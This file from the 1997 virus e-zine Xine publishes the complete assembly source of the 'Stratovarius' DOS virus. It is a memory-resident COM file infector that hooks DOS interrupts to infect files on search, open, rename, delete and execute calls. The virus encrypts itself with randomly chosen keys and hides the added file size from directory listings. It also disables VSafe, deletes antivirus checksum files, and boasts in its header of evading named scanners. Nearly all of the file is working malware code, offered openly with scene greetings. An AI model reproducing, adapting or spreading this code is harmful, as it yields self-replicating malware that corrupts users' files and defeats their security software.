   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 209 |
   ;                                        \-----------------------------/



   ; Comment #
   ;
   ;                    . * * * * * * * * * * * * * * * * * .
   ;                    *  NAME  : Stratovarius Virus       *
   ;                    *  AUTHOR: Int13h                   *
   ;                    *  ORIGEN: Paraguay, South America  *
   ;                    . * * * * * * * * * * * * * * * * * .
   ;
   ;
   ;  Technical Overview
   ;  ------------------
   ;
   ;  - Appending TSR COM mega-fast infector. Infects on:
   ;
   ;     .Find first / find next FCB (011h/012h)
   ;     .Find first / find next DTA (04eh/04fh)
   ;     .Normal Open                (03dh)
   ;     .Extended Open              (06c00h)
   ;     .Rename                     (056h)
   ;     .Delete                     (041h)
   ;     .Get/Change Atributes       (043h)
   ;     .Execution                  (04bh)
   ;
   ;  - Directory Stealth
   ;  - Encrypted (uses ADD, SUB and XOR randomily)
   ;  - No viral activity under Novell Netware or DOS >= 7
   ;  - Tunneling by PSP tracing
   ;  - Antiheuristic comparison of INT 21h's functions
   ;  - Opens the file in read-only mode then changes axs mode in SFT
   ;  - Installs Dummy Error Handler
   ;  - Kills Vsafe by turning off its flags while infecting
   ;  - Kills some sucker's checksum files
   ;  - Doesn't infects COMs inmunized by CPAV
   ;  - Turns off the trap flag to avoid 21h's tunneling
   ;  - Stealth on 3521h and 2521h of INT 21h. Virus is alway first
   ;  - It isn't flagged by TBAV 8.01, FindVirus 7.72, F-prot 3.0, AVP 3.0
   ;  - "Approached stack crash" when TBcleaning
   ;  - EXE version available soon, look for it in the betters shoppings ;)
   ;
   ; = = = = = = = = = = = [ DeDiCaTeD tO StRaToVaRiUs ] = = = = = = = = = = = =
   ;
   ;
   ;          "A computer virus should be considered a form of life,
   ;           but I think it says something about human nature,
   ;           that the only form of life we have created so far
   ;           is purely destructive.
   ;           We've created life in our own image."
   ;
   ;                                         Dr. Stephen Hawking, 1994
   ;
   ;
   ;  Greetz to all life creators and heavy metal lovers under the sun.
   ;  Special greetz goes to: all 29A crew, Methyl, r- and Executioner.
   ;
   ;  My respects to F3161, Dark Avenger, Vyvojar and Neurobasher.
   ;
   ; = = = = = = = = = = = = =[ MaDe In PaRaGuAy ]= = = = = = = = = = = = = = =
   ;
   ; #

   .model tiny
   .code
   jumps
   org 100h


   Skip       equ  (offset Encripted-offset Stratovarius)
   Cripted    equ  (offset Omega-offset Encripted)/2
   Largor     equ  (offset Omega-offset Stratovarius)
   EnMemoria  equ  (offset FinEnMemoria-offset Stratovarius)
   Parrafos1  equ  ((EnMemoria+15)/16)+1
   Parrafos2  equ  ((EnMemoria+15)/16)


   Stratovarius:
           mov     bp,sp
           int     03h
           mov     bp,word ptr ss:[bp-06]
           sub     bp,103h

           not     sp
           not     sp

           lea     si,[bp+offset Encripted]
           push    si
           mov     di,si
           mov     cx,Cripted

   Kilomber:
           lodsw
           db      035h
           Clave   dw 0
           stosw
           loop    Kilomber
           ret


   Encripted:
           mov     ah,30h
           int     21h

           cmp     al,7
           jae     Cancel

           mov     ax,0db00h
           int     21h
           or      al,al
           jz      No_Novell
   Cancel: jmp     Ya_Resides

   No_Novell:
           mov     ah,058h
           int     21h
           cmp     ax,0cd13h
           je      Ya_Resides

           mov     ax,3521h
           int     21h
           mov     cs:[bp+word ptr Vieja21h],bx
           mov     cs:[bp+word ptr Vieja21h+2],es
           mov     cs:[bp+word ptr Real21h],bx
           mov     cs:[bp+word ptr Real21h+2],es
           push    ds

           lds     bx,ds:[0006h]
   Tracear:cmp     byte ptr ds:[bx],0eah
           jne     Chekear
           lds     bx,ds:[bx+1]
           cmp     word ptr ds:[bx],9090h
           jnz     Tracear
           sub     bx,32h
           cmp     word ptr ds:[bx],9090h
           jne     Chekear
   Hallado:mov     cs:[bp+word ptr Real21h],bx
           mov     cs:[bp+word ptr Real21h+2],ds
           jmp     short MCBTSR
   Chekear:cmp     word ptr ds:[bx],2e1eh
           jnz     MCBTSR
           add     bx,25h
           cmp     word ptr ds:[bx],80fah
           je      Hallado

   MCBTSR: pop     ds
           mov     ax,ds
           dec     ax
           mov     es,ax
           mov     ax,es:[3]
           sub     ax,Parrafos1
           xchg    bx,ax

           push    ds
           pop     es
           mov     ah,4ah
           int     21h

           mov     ah,48h
           mov     bx,Parrafos2
           int     21h

           dec     ax
           mov     es,ax
           mov     word ptr es:[1],8
           mov     word ptr es:[8],0cd13h
           inc     ax
           mov     es,ax
           sub     di,di

           push    cs
           pop     ds
           lea     si,[bp+offset Stratovarius]
           mov     cx,Largor
           rep     movsb

           int     03h

           push    es
           pop     ds
           mov     ax,2521h
           mov     dx,(offset FalsaINT21h-100h)
           int     21h


   Ya_Resides:
           push    cs
           push    cs
           pop     ds
           pop     es

           xor     ax,ax
           lea     si,[bp+offset Primitivos]
           mov     di,100h
           push    di
           cld
           movsw
           movsw

           xchg    bx,ax
           mov     ax,bx
           sub     cx,cx
           xor     dx,dx
           sub     si,si
           xor     di,di
           sub     bp,bp
           ret


   Chequear2:
           xor     ah,0bah
           pushf
           push    cs
           call    Interrupcion_21h
           jc      Paso

           pushf
           push    ax
           push    bx
           push    cx
           push    dx
           push    si
           push    di
           push    ds
           push    es

           mov     ah,2fh
           int     21h

           mov     di,bx
           add     di,1eh
           mov     si,di
           cld
           mov     cx,9
           mov     al,'.'
           repne   scasb
           jne     Aborto

           cmp     word ptr es:[di],'OC'
           jne     Aborto

           cmp     byte ptr es:[di+2],'M'
           jne     Aborto

           cmp     word ptr es:[bx+1ah],029ah
           jb      Aborto

           mov     dx,si
           push    es
           pop     ds

           mov     ax,3d00h
           pushf
           push    cs
           call    Interrupcion_21h
           jc      Aborto
           xchg    bx,ax

           call    SetInt24hAndKillSuckers

           call    Analisis
           jc      Cierre
           call    Infectar

   Cierre: mov     ah,3eh
           int     21h
           call    RestoreInt24hAndVsafe

   Aborto: pop     es
           pop     ds
           pop     di
           pop     si
           pop     dx
           pop     cx
           pop     bx
           pop     ax
           popf
   Paso:   retf    2



   FalsaINT21h:
           push    ax
           pushf
           pop     ax
           and     ah,11111110b
           push    ax
           popf
           pop     ax
           xor     ah,0bah
           cmp     ah,(58h xor 0bah)
           je      Detect
           cmp     ah,(11h xor 0bah)
           je      Chequear1
           cmp     ah,(12h xor 0bah)
           je      Chequear1
           cmp     ah,(4eh xor 0bah)
           je      Chequear2
           cmp     ah,(4fh xor 0bah)
           je      Chequear2
           cmp     ah,(4bh xor 0bah)
           je      Chequear3
           cmp     ah,(56h xor 0bah)
           je      Chequear3
           cmp     ah,(41h xor 0bah)
           je      Chequear3
           cmp     ah,(43h xor 0bah)
           je      Chequear3
           cmp     ah,(3dh xor 0bah)
           je      Chequear3
           cmp     ax,08f21h
           je      Ocultar21h_A
           cmp     ax,09f21h
           je      Ocultar21h_B
           xor     ah,0bah
   Abuela_21h:
           db      0eah
   Vieja21h dw     0,0
           ret
   Detect: mov     ax,0cd13h
           iret



   Ocultar21h_A:
           xor     ah,0bah
           mov     bx,cs:[word ptr (Vieja21h-100h)]
           mov     es,cs:[word ptr (Vieja21h-100h)+2]
           iret

   Ocultar21h_B:
           xor     ah,0bah
           mov     cs:[word ptr (Vieja21h-100h)],dx
           mov     cs:[word ptr (Vieja21h-100h)+2],ds
           iret



   Chequear1:
           xor     ah,0bah
           pushf
           push    cs
           call    Interrupcion_21h
           test    al,al
           jne     ErrorDir

           push    ax
           push    bx
           push    cx
           push    dx
           push    si
           push    di
           push    ds
           push    es

           mov     ah,62h
           int     21h

           mov     es,bx
           cmp     bx,es:[16h]
           jne     GoingOut

           mov     bx,dx
           mov     al,[bx]
           push    ax
           push    es

           call    SetInt24hAndKillSuckers

           pop     es
           mov     ah,2fh
           int     21h
           pop     ax
           inc     al
           jnz     FCBNormal
           add     bx,7

   FCBNormal:
           mov     cs:[Maestro-100h],bx
           mov     ax,word ptr es:[bx+09h]
           or      ax,02020h
           cmp     ax,'oc'
           jne     Fuera

           mov     al,byte ptr es:[bx+0bh]
           or      al,020h
           cmp     al,'m'
           jne     Fuera

           push    es
           pop     ds
           push    cs
           pop     es
           mov     di,(offset Victima-100h)
           push    di
           mov     cx,13
           xor     al,al
           repe    stosb
           pop     di
           inc     bx
           mov     si,bx
           mov     cx,8
    Buscar:lodsb
           cmp     al,' '
           je      Opa
           stosb
           loop    Buscar

   Opa:    mov     al,'.'
           stosb
           mov     cx,3

           mov     si,bx
           add     si,08h
   Exten:  lodsb
           cmp     al,' '
           je      Opa2
           stosb
           loop    Exten
   Opa2:   push    ds
           pop     es
           push    cs
           pop     ds

           mov     dx,(offset Victima-100h)
           mov     ax,3d00h
           pushf
           push    cs
           call    Interrupcion_21h
           jc      Fuera
           xchg    bx,ax

           call    Analisis
           jc      Closeo
           call    Infectar

   Closeo: mov     ah,3eh
           int     21h

           cmp     di,32
           jne     Fuera

           mov     bx,cs:[Maestro-100h]
           cmp     word ptr es:[bx+1dh],(Largor+666)
           jb      Fuera

           sub     word ptr es:[bx+1dh],Largor

   Fuera:  call    RestoreInt24hAndVsafe

   GoingOut:
           pop     es
           pop     ds
           pop     di
           pop     si
           pop     dx
           pop     cx
           pop     bx
           pop     ax
   ErrorDir:
           retf    2



   Chequear3:
           xor     ah,0bah
           push    ax
           push    bx
           push    cx
           push    dx
           push    si
           push    di
           push    ds
           push    es

           cmp     ax,6c00h
           jne     Apertura_Normal

           cmp     dx,0001
           jne     Popear

           mov     dx,si

   Apertura_Normal:
           push    ds
           pop     es
           cld
           mov     di,dx
           mov     cx,128
           mov     al,'.'
           repne   scasb
           jne     Popear

           xchg    si,di
           lodsw
           or      ax,2020h
           cmp     ax,'oc'
           jne     Popear
           lodsb
           or      al,20h
           cmp     al,'m'
           jne     Popear

           mov     ax,3d00h
           pushf
           push    cs
           call    Interrupcion_21h
           jc      Popear
           xchg    bx,ax

           call    SetInt24hAndKillSuckers

           call    Analisis
           jc      Cierro
           call    Infectar

   Cierro: mov     ah,3eh
           int     21h
           call    RestoreInt24hAndVsafe

   Popear: pop     es
           pop     ds
           pop     di
           pop     si
           pop     dx
           pop     cx
           pop     bx
           pop     ax
           jmp     Abuela_21h




   SetInt24hAndKillSuckers:
           push    bx
           mov     ax,3524h
           int     21h
           mov     word ptr cs:[(Vieja24h-100h)],bx
           mov     word ptr cs:[(Vieja24h-100h)+2],es

           push    cs
           pop     ds
           mov     ax,2524h
           mov     dx,(offset Handler24h-100h)
           int     21h

           mov     ax,4301h
           mov     dx,(offset Basura1-100h)
           sub     cx,cx
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ah,41h
           mov     dx,(offset Basura1-100h)
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ah,41h
           mov     dx,(offset Basura2-100h)
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ah,41h
           mov     dx,(offset Basura3-100h)
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ah,41h
           mov     dx,(offset Basura4-100h)
           pushf
           push    cs
           call    Interrupcion_21h

           mov     ax,0fa02h
           mov     dx,5945h
           xor     bl,bl
           int     16h
           mov     byte ptr cs:[Vsuck-100h],cl
           pop     bx
           ret



   RestoreInt24hAndVsafe:
           lds     dx,dword ptr cs:[(Vieja24h-100h)]

           mov     ax,2524h
           int     21h

           mov     ax,0fa02h
           mov     dx,5945h
           mov     bl,byte ptr cs:[Vsuck-100h]
           and     bl,11111011b
           int     16h
           ret



   Handler24h:
           xor     al,al
           iret



   Analisis:
           xor     di,di

           mov     ah,03fh
           mov     dx,(offset Primitivos-100h)
           mov     cx,4
           int     21h

           mov     si,dx
           cmp     byte ptr [si+3],'S'
           jne     Go

           mov     di,32
           jmp     short Malo

    Go:    cmp     byte ptr [si+3],00
           je      Malo

           mov     ax,[si]
           add     ah,al
           cmp     ah,167d
           je      Malo

           mov     ax,04202h
           sub     cx,cx
           cwd
           int     21h

           cmp     ax,63000d
           ja      Malo

           cmp     ax,666d
           jb      Malo

           clc
           ret

   Malo:   stc
           ret




   Infectar:
           sub     ax,3
           mov     word ptr [Brinco-100h+1],ax

   Otro:   in      ax,40h
           and     ax,ax
           je      Otro

           mov     dl,al
           mov     [Clave-100h],ax

           mov     si,(offset Kilomber-100h)
           cmp     dl,65
           jb      Subbing

           cmp     dl,140
           jb      Adding

           mov     [si],035adh
           jmp     short Copiar_al_buffer

   Subbing:mov     [si],02dadh
           jmp     short Copiar_al_buffer

   Adding: mov     [si],005adh


   Copiar_al_buffer:
           push    es
           push    cs
           pop     es
           mov     cx,(Largor/2)
           xor     si,si
           mov     di,(offset StratoVir-100h)
           rep     movsw

           mov     si,(offset Kilomber-100h)
           cmp     dl,65
           jb      AntiSubbing

           cmp     dl,140
           jb      AntiAdding

           mov     [si],035adh
           jmp     short Cifrar_Virus

   AntiSubbing:
           mov     [si],005adh
           jmp     short Cifrar_Virus

   AntiAdding:
           mov     [si],02dadh

   Cifrar_Virus:
           mov     cx,Cripted
           mov     si,(offset StratoVir+Skip)-100h
           mov     di,si
           call    Kilomber
           pop     es

           mov     ax,5700h
           int     21h
           push    cx
           push    dx

           push    bx
           mov     ax,1220h
           int     2fh

           mov     ax,1216h
           xor     bh,bh
           mov     bl,es:[di]
           int     2fh

           mov     byte ptr es:[di+2],02
           pop     bx

           mov     ah,40h
           mov     cx,Largor
           mov     dx,(offset StratoVir-100h)
           int     21h

           mov     word ptr es:[di+015h],00

           mov     ah,40h
           mov     cx,4
           mov     dx,(offset Brinco-100h)
           int     21h

           mov     ax,5701h
           pop     dx
           pop     cx
           int     21h

           ret



   Interrupcion_21h:
           db      0eah
   Real21h dw      0,0
           ret


   MotherSucker db ' Weasseline Bontchev sux! '    ; "weasel" (tm) dark avenger
   Brinco       db 0e9h,00h,00h,'S'
                db ' [STRATOVARIUS Virus]  (c) Copyright Int13h 02/08/97 ',13,10
                db ' Dedicated to the great finland group of purified heavy metal ',13,10
                ; Timmo Tolkki has a great voice too
                db ' Guitars (speed-of-the-light): Timmo Tolkki',13,10
                db ' Vocals: Timmo Kotipelto',13,10
                db ' Bass: Jari Kainulainez',13,10
                db ' Drums: J”rg Michael',13,10
                db ' Keyboards: Jens Johansson',13,10
   Albums       db ' Fright Night - Twilight Time - Dream Space - Fourth Dimension - Episode - Visions '

   ; Listen...
   ; Hold on to your dream. Fourth Reich. Chasing Shadows. We are the future
   ; Shaterred.Break the Ice.Father Time.Will the sun rise. Agains the wind.
   ; Speed of the light. Eternity.Stratosphere. Black Diamond. Kiss of Judas
   ; Coming Home... and a lot more of amazing songs by Stratovarius!!!!!!!!!

   Primitivos   db 090h,090h,0cdh,020h
                db " MaDeInPaRaGuAySoUtHaMeRiCa "
   Basura1      db 'anti-vir.dat',0
   Basura2      db 'chklist.ms',0
   Basura3      db 'chklist.cps',0
   Basura4      db 'avp.crc',0

   Omega:
   heLLowEEn    dw 0
   Vsuck        db 0
   Maestro      dw 0
   Victima      db 13 dup(0)
   Vieja24h     dd 0
   StratoVir    db Largor dup('S')
   FinEnMemoria:
   End Stratovarius
